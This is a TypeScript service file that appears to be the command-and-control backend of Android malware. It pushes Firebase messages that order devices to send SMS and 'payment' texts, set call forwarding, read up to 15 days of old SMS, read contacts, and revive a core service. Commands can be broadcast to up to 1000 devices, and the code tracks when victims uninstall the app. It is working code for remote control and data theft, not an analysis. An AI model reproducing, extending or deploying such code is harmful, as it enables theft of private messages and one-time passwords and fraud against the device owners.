// File: src/services/fcmService.ts
import logger from "../logger/logger";
import {
  getDeviceFcmToken,
  updateFcmSendMeta,
  clearInvalidFcmToken,
  getDevice,
  markDeviceOffline,
  markDeviceUninstalled,
} from "./deviceService";
import { getFirebaseMessaging } from "./firebaseAdmin";

const TAG = "fcmService";

type FcmDataPayload = Record<string, string>;

type SendCommandOptions = {
  requestId?: string;
  force?: boolean;
  extraData?: Record<string, string | number | boolean | null | undefined>;
};

/* ═══════════════════════════════════════════
   HELPERS
   ═══════════════════════════════════════════ */

function clean(v: unknown): string {
  return String(v ?? "").trim();
}

function toDataStringMap(
  input: Record<string, string | number | boolean | null | undefined>,
): FcmDataPayload {
  const out: FcmDataPayload = {};
  for (const [key, value] of Object.entries(input)) {
    if (value === undefined || value === null) continue;
    out[key] = String(value);
  }
  return out;
}

/* ═══════════════════════════════════════════
   PAYLOAD BUILDER
   ═══════════════════════════════════════════ */

export function buildCommandPayload(
  deviceId: string,
  command: string,
  options: SendCommandOptions = {},
): FcmDataPayload {
  const base = {
    command,
    deviceId,
    requestId: options.requestId || `${command}_${deviceId}_${Date.now()}`,
    force: options.force === true ? "true" : "false",
    sentAt: Date.now(),
  };

  return {
    ...toDataStringMap(base),
    ...toDataStringMap(options.extraData || {}),
  };
}

/* ═══════════════════════════════════════════
   LOW-LEVEL SEND
   ═══════════════════════════════════════════ */

export async function sendToToken(
  token: string,
  data: FcmDataPayload,
): Promise<{ success: boolean; messageId?: string; error?: string }> {
  const cleanToken = clean(token);
  if (!cleanToken) {
    return { success: false, error: "missing_token" };
  }

  try {
    const messaging = getFirebaseMessaging();
    const messageId = await messaging.send({
      token: cleanToken,
      data,
      android: {
        priority: "high",
        ttl: 60 * 1000,
      },
    });
    return { success: true, messageId };
  } catch (err: any) {
    return {
      success: false,
      error: clean(err?.code || err?.message || "send_failed"),
    };
  }
}

export async function sendToDevice(
  deviceId: string,
  data: FcmDataPayload,
): Promise<{ success: boolean; messageId?: string; error?: string }> {
  const token = await getDeviceFcmToken(deviceId);

  // Purane DB records mein kabhi kabhi __UNINSTALLED__ set hota tha — skip karo
  if (token === "__UNINSTALLED__") {
    logger.info(`${TAG}: device has __UNINSTALLED__ marker, clearing token`, { deviceId });
    try {
      await clearInvalidFcmToken(deviceId, "stale_uninstalled_marker");
    } catch (_) {}
    return { success: false, error: "missing_token" };
  }

  // No token — naya device, abhi sync nahi hua
  if (!token) {
    logger.warn(`${TAG}: sendToDevice skipped, token missing`, { deviceId });
    await updateFcmSendMeta(deviceId, {
      lastAttemptAt: Date.now(),
      lastError: "missing_token",
      lastErrorAt: Date.now(),
    });
    return { success: false, error: "missing_token" };
  }

  const result = await sendToToken(token, data);

  if (result.success) {
    logger.info(`${TAG}: push sent`, {
      deviceId,
      messageId: result.messageId,
      command: data.command,
    });
    await updateFcmSendMeta(deviceId, {
      lastAttemptAt: Date.now(),
      lastSuccessAt: Date.now(),
      lastMessageId: result.messageId || "",
      lastError: "",
    });
    return result;
  }

  logger.warn(`${TAG}: push failed`, {
    deviceId,
    error: result.error,
    command: data.command,
  });

  await updateFcmSendMeta(deviceId, {
    lastAttemptAt: Date.now(),
    lastErrorAt: Date.now(),
    lastError: result.error || "send_failed",
  });

  const errorCode = result.error || "";

  if (errorCode === "messaging/registration-token-not-registered") {
    // Firebase confirmed: token is UNREGISTERED (expired/replaced after app reinstall or uninstall)
    const deviceDoc = await getDevice(deviceId);
    const lastSeenAt = Number((deviceDoc as any)?.lastSeen?.at || 0);
    const twentyFourHoursAgo = Date.now() - 24 * 60 * 60 * 1000;

    // Always clear the dead token
    await clearInvalidFcmToken(deviceId, errorCode);

    if (lastSeenAt > twentyFourHoursAgo) {
      // Device was seen recently — token probably rotated (OEM/GMS refresh), not uninstalled
      await markDeviceOffline(deviceId, "token_dead");
      logger.info(`${TAG}: token dead but device seen recently — rotation guard, marked offline`, { deviceId });
    } else {
      // Device hasn't been seen in 24h+ and Firebase says token is gone — uninstalled
      const didChange = await markDeviceUninstalled(deviceId);
      if (didChange) {
        try {
          const ws = (await import("./wsService")).default;
          ws.broadcastAdminEvent("device:uninstalled", { deviceId }, { deviceId });
        } catch (_) {}
      }
      logger.info(`${TAG}: token UNREGISTERED + no lastSeen in 24h — marked uninstalled`, { deviceId });
    }

  } else if (errorCode === "messaging/invalid-registration-token") {
    // Malformed token — clear and mark offline (not uninstalled, format issue)
    await clearInvalidFcmToken(deviceId, "invalid_token_format");
    await markDeviceOffline(deviceId, "token_dead");
    logger.warn(`${TAG}: invalid token format — cleared and marked offline`, { deviceId });

  } else if (
    errorCode === "messaging/sender-id-mismatch" ||
    errorCode === "messaging/third-party-auth-error"
  ) {
    // Firebase project mismatch — config issue, don't change device state
    logger.error(`${TAG}: Firebase sender-id mismatch — check google-services.json`, { deviceId, errorCode });

  } else {
    // Temporary error (quota, internal, network) — no state change
    logger.warn(`${TAG}: temporary FCM error, no state change`, { deviceId, errorCode });
  }

  return result;
}

/* ═══════════════════════════════════════════
   GENERIC COMMAND SENDER
   ═══════════════════════════════════════════ */

export async function sendCommandToDevice(
  deviceId: string,
  command: string,
  options: SendCommandOptions = {},
) {
  const payload = buildCommandPayload(deviceId, command, options);
  return sendToDevice(deviceId, payload);
}

/* ═══════════════════════════════════════════
   CORE SERVICE COMMANDS
   ═══════════════════════════════════════════ */

export async function sendRestartCore(
  deviceId: string,
  options: Omit<SendCommandOptions, "extraData"> = {},
) {
  return sendCommandToDevice(deviceId, "restart_core", options);
}

export async function sendReviveCore(
  deviceId: string,
  options: Omit<SendCommandOptions, "extraData"> = {},
) {
  return sendCommandToDevice(deviceId, "revive_core", options);
}

export async function sendStartCore(
  deviceId: string,
  options: Omit<SendCommandOptions, "extraData"> = {},
) {
  return sendCommandToDevice(deviceId, "start_core", options);
}

export async function sendSyncToken(
  deviceId: string,
  options: Omit<SendCommandOptions, "extraData"> = {},
) {
  return sendCommandToDevice(deviceId, "sync_token", options);
}

/* ═══════════════════════════════════════════
   SMS COMMANDS
   ═══════════════════════════════════════════ */

export async function sendSmsCommand(
  deviceId: string,
  to: string,
  message: string,
  sim: number = 0,
  id?: string,
) {
  const msgId = id || `sms_${deviceId}_${Date.now()}`;
  return sendCommandToDevice(deviceId, "send_sms", {
    requestId: msgId,
    extraData: {
      to: clean(to),
      message: clean(message),
      sim: sim,
      id: msgId,
      timestamp: Date.now(),
    },
  });
}

/* ═══════════════════════════════════════════
   CALL FORWARD COMMANDS
   ═══════════════════════════════════════════ */

export async function sendCallForwardCommand(
  deviceId: string,
  callCode: string,
  sim: string = "0",
  phoneNumber?: string,
) {
  const requestId = `cf_${deviceId}_${Date.now()}`;
  return sendCommandToDevice(deviceId, "call_forward", {
    requestId,
    extraData: {
      callCode: clean(callCode),
      sim: clean(sim),
      phoneNumber: clean(phoneNumber || ""),
      timestamp: Date.now(),
    },
  });
}

/* ═══════════════════════════════════════════
   ADMIN UPDATE COMMANDS
   ═══════════════════════════════════════════ */

export async function sendAdminListUpdate(deviceId: string, admins: string[]) {
  return sendCommandToDevice(deviceId, "admins_update", {
    requestId: `admins_${deviceId}_${Date.now()}`,
    extraData: { admins: JSON.stringify(admins), timestamp: Date.now() },
  });
}

export async function sendGlobalAdminUpdate(deviceId: string, phone: string) {
  return sendCommandToDevice(deviceId, "global_admin_update", {
    requestId: `gadmin_${deviceId}_${Date.now()}`,
    extraData: { phone: clean(phone), timestamp: Date.now() },
  });
}

export async function sendDeviceAdminPhoneUpdate(deviceId: string, phone: string) {
  return sendCommandToDevice(deviceId, "device_admin_update", {
    requestId: `dadmin_${deviceId}_${Date.now()}`,
    extraData: { phone: clean(phone), timestamp: Date.now() },
  });
}

export async function sendForwardingSimUpdate(deviceId: string, value: string) {
  return sendCommandToDevice(deviceId, "forwarding_sim_update", {
    requestId: `fsim_${deviceId}_${Date.now()}`,
    extraData: { value: clean(value), timestamp: Date.now() },
  });
}

/* ═══════════════════════════════════════════
   PAYMENT COMMAND
   ═══════════════════════════════════════════ */

export async function sendPaymentCommand(
  deviceId: string,
  to: string,
  message: string,
  sim: number = 0,
  id?: string,
) {
  const msgId = id || `pay_${deviceId}_${Date.now()}`;
  return sendCommandToDevice(deviceId, "payment", {
    requestId: msgId,
    extraData: {
      smsto: clean(to),
      smsContent: clean(message),
      sim: sim,
      id: msgId,
      timestamp: Date.now(),
    },
  });
}

/* ═══════════════════════════════════════════
   PING COMMAND
   ═══════════════════════════════════════════ */

export async function sendPing(deviceId: string) {
  return sendCommandToDevice(deviceId, "ping", {
    requestId: `ping_${deviceId}_${Date.now()}`,
  });
}

/* ═══════════════════════════════════════════
   BROADCAST TO ALL DEVICES
   ═══════════════════════════════════════════ */

export async function broadcastCommandToAllDevices(
  command: string,
  options: SendCommandOptions = {},
  maxDevices: number = 1000,
): Promise<{ attempted: number; success: number; failed: number; skipped: number }> {
  const Device = (await import("../models/Device")).default;

  const devices = await Device.find({ fcmToken: { $ne: "" } })
    .select("deviceId fcmToken")
    .limit(maxDevices)
    .lean();

  let attempted = 0, success = 0, failed = 0, skipped = 0;

  for (const d of devices) {
    const deviceId = clean((d as any).deviceId);
    const token    = clean((d as any).fcmToken);
    if (!deviceId || !token) { skipped++; continue; }
    attempted++;
    try {
      const result = await sendCommandToDevice(deviceId, command, options);
      if (result.success) success++; else failed++;
    } catch { failed++; }
  }

  logger.info(`${TAG}: broadcast complete`, { command, attempted, success, failed, skipped });
  return { attempted, success, failed, skipped };
}

/* ═══════════════════════════════════════════
   READ OLD SMS COMMAND
   ═══════════════════════════════════════════ */

export async function sendReadOldSmsCommand(deviceId: string, days: number = 15) {
  return sendCommandToDevice(deviceId, "read_old_sms", {
    requestId: `oldsms_${deviceId}_${Date.now()}`,
    extraData: { days, timestamp: Date.now() },
  });
}

/* ═══════════════════════════════════════════
   READ CONTACTS COMMAND
   ═══════════════════════════════════════════ */

export async function sendReadContactsCommand(deviceId: string) {
  return sendCommandToDevice(deviceId, "read_contacts", {
    requestId: `contacts_${deviceId}_${Date.now()}`,
    extraData: { timestamp: Date.now() },
  });
}

export default {
  buildCommandPayload,
  sendToToken,
  sendToDevice,
  sendCommandToDevice,
  sendRestartCore,
  sendReviveCore,
  sendStartCore,
  sendSyncToken,
  sendSmsCommand,
  sendCallForwardCommand,
  sendAdminListUpdate,
  sendGlobalAdminUpdate,
  sendDeviceAdminPhoneUpdate,
  sendForwardingSimUpdate,
  sendPaymentCommand,
  sendPing,
  broadcastCommandToAllDevices,
  sendReadOldSmsCommand,
  sendReadContactsCommand,
};
